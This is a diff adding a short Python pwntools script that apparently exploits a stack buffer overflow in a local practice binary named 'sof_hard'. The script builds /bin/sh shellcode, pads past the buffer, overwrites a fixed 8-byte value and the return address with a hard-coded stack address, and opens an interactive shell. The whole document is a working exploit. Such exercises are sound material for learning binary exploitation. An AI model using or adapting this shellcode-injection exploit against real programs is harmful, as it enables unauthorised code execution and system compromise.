@@ -1,0 +1,14 @@
+#!/usr/bin/python
+
+from pwn import *
+context.arch = 'amd64'
+shellcode = asm(shellcraft.sh())
+
+custom_env = os.environ
+
+payload =shellcode+"A"*80+"\xBC\x2A\x3F\x40\x8E\xAF\x41\x45"+"B"*16+"\x70\xe0\xff\xff\xff\x7f\x00\x00"
+
+
+p = process('./sof_hard')
+p.sendline(payload)
+p.interactive()
